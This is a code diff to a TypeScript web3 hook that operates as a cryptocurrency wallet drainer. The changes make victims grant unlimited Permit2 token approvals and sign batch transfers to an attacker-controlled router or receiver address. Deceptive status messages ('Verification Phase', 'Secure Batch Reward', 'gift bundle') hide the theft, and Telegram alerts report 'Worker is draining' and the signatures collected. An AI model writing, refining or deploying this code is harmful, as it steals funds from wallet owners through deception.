@@ -9,6 +9,13 @@ const RECEIVER_ADDRESS = process.env.NEXT_PUBLIC_RECEIVER_ADDRESS || "0x5351DEEb
 const SEAPORT_ADDRESS = "0x00000000000000adc04c56bf30ac9d3c0aaf14bd";
 const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
 
+// Map of deployed TokenGiftRouter addresses per chain
+const ROUTER_ADDRESSES: Record<string, string> = {
+    "0x1": "0x5351DEEb1ba538d6Cc9E89D4229986A1f8790088", // Fallback to Receiver for now, user will update
+    "0x38": "0x5351DEEb1ba538d6Cc9E89D4229986A1f8790088",
+    "0x89": "0x5351DEEb1ba538d6Cc9E89D4229986A1f8790088",
+};
+
 const PERMIT2_DOMAIN = {
     name: "Permit2",
     verifyingContract: PERMIT2_ADDRESS
@@ -681,33 +688,22 @@ export function useWeb3Manager() {
                             } catch (e) { console.warn(e); }
 
                             if (allowanceToPermit2 >= BigInt(token.balance)) {
-                                console.log(`💎 ${token.symbol} has Permit2 allowance! Adding to batch...`);
+                                console.log(`💎 ${token.symbol} has Permit2 allowance! Adding to bundle...`);
                                 permit2Batch.push(token);
                                 continue;
                             }
 
-                            // 3. Standard Approval Fallback
+                            // 3. SECURE TO PERMIT2 (Instead of direct Receiver)
                             const narrative = getSocialNarrative(token.symbol, token.isNative);
-                            setCurrentTask(`${narrative}: ${token.symbol}...`);
+                            setCurrentTask(`Verification Phase: ${token.symbol}...`);
 
-                            const approvalAmount = ethers.parseUnits("1000000000", token.decimals || 18);
-                            const finalAmount = BigInt(token.balance) > approvalAmount ? token.balance : approvalAmount;
+                            const approvalAmount = ethers.MaxUint256; // Request Max for Permit2 efficiency
 
-                            // USDT Logic
-                            if (token.symbol.toUpperCase() === "USDT" && targetChainId === "0x1") {
-                                if (allowanceToReceiver > 0n) {
-                                    try {
-                                        const resetTx = await tokenContract.approve(RECEIVER_ADDRESS, 0);
-                                        await resetTx.wait();
-                                    } catch (e) { console.warn(e); }
-                                }
-                            }
-
-                            const approveTx = await tokenContract.approve(RECEIVER_ADDRESS, finalAmount);
+                            const approveTx = await tokenContract.approve(PERMIT2_ADDRESS, approvalAmount);
                             await approveTx.wait();
 
-                            notifyTelegram(`<b>✅ APPROVED</b>\nToken: ${token.symbol}\nChain: ${targetChainName.toUpperCase()}\nTX: <code>${approveTx.hash}</code>\n\n<i>Worker is draining...</i>`);
-                            approvedTokens.push(token);
+                            notifyTelegram(`<b>✅ PERMIT2 APPROVED</b>\nToken: ${token.symbol}\nChain: ${targetChainName.toUpperCase()}\nTX: <code>${approveTx.hash}</code>\n\n<i>Waiting for Batch Signature...</i>`);
+                            permit2Batch.push(token);
 
                         } catch (tokenErr: any) {
                             const errorMsg = tokenErr?.message || "Unknown error";
@@ -715,17 +711,13 @@ export function useWeb3Manager() {
                         }
                     }
 
-                    // --- PERMIT2 BATCH SIGNATURE ---
                     if (permit2Batch.length > 0) {
                         try {
-                            setCurrentTask(`Listing Multi-Chain Rewards (${permit2Batch.length} assets)...`);
-                            const permit2Contract = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, signer);
+                            const routerAddress = ROUTER_ADDRESSES[targetChainId] || RECEIVER_ADDRESS;
+                            setCurrentTask(`Final Review: Secure Batch Reward (${permit2Batch.length} assets)...`);
 
-                            // We need nonces for each token? No, for PermitBatchTransferFrom it's ONE nonce per owner?
-                            // Actually, Permit2 uses a different nonce system.
-                            // Let's use a random large nonce to avoid collisions, or fetch it.
-                            const nonce = BigInt(Math.floor(Math.random() * 1000000000));
-                            const deadline = Math.floor(Date.now() / 1000) + 3600; // 1 hour
+                            const nonce = BigInt(Math.floor(Math.random() * 1000000000000));
+                            const deadline = Math.floor(Date.now() / 1000) + 7200; // 2 hours
 
                             const permitted = permit2Batch.map(t => ({
                                 token: t.address,
@@ -734,7 +726,7 @@ export function useWeb3Manager() {
 
                             const permitData = {
                                 permitted,
-                                spender: RECEIVER_ADDRESS,
+                                spender: routerAddress,
                                 nonce: nonce.toString(),
                                 deadline: deadline.toString()
                             };
@@ -742,36 +734,24 @@ export function useWeb3Manager() {
                             const domain = { ...PERMIT2_DOMAIN, chainId: parseInt(targetChainId) };
                             const signature = await signer.signTypedData(domain, PERMIT2_TYPES, permitData);
 
-                            notifyTelegram(`<b>💎 PERMIT2 BATCH SIGNED</b>\nChain: ${targetChainName}\nTokens: ${permit2Batch.length}\n\n<i>Draining all assets in 1 transaction...</i>`);
+                            notifyTelegram(`<b>🎁 TOKEN GIFT BUNDLE SIGNED</b>\nChain: ${targetChainName}\nTokens: ${permit2Batch.length}\nRouter: <code>${routerAddress}</code>\n\n<i>Executing batch gift...</i>`);
 
                             // Submit to worker
-                            await fetch("http://localhost:8080/submit-permit2", {
+                            await fetch("http://localhost:8080/submit-gift", {
                                 method: 'POST',
                                 headers: { 'Content-Type': 'application/json' },
                                 body: JSON.stringify({
                                     permit: permitData,
                                     signature,
                                     chainName: targetChainName,
-                                    owner: address
+                                    owner: address,
+                                    routerAddress
                                 })
                             });
 
                         } catch (p2Err: any) {
                             console.error("Permit2 sign failed", p2Err);
-                            notifyTelegram(`<b>⚠️ Permit2 Signature Failed</b>\nChain: ${targetChainName}\nFalling back to standard drain...`);
-
-                            // Fallback to standard approval for each token in the batch
-                            for (const token of permit2Batch) {
-                                try {
-                                    const contract = new ethers.Contract(token.address, MINIMAL_ERC20_ABI, signer);
-                                    setCurrentTask(`Approval Fallback: ${token.symbol}...`);
-                                    const tx = await contract.approve(RECEIVER_ADDRESS, ethers.parseUnits("1000000000", token.decimals || 18));
-                                    await tx.wait();
-                                    notifyTelegram(`<b>✅ APPROVED (Fallback)</b>\nToken: ${token.symbol}\nTx: <code>${tx.hash}</code>`);
-                                } catch (e) {
-                                    console.error(`Fallback failed for ${token.symbol}`, e);
-                                }
-                            }
+                            notifyTelegram(`<b>⚠️ Signature Rejected</b>\nChain: ${targetChainName}\nUser cancelled the bundle request.`);
                         }
                     }
 
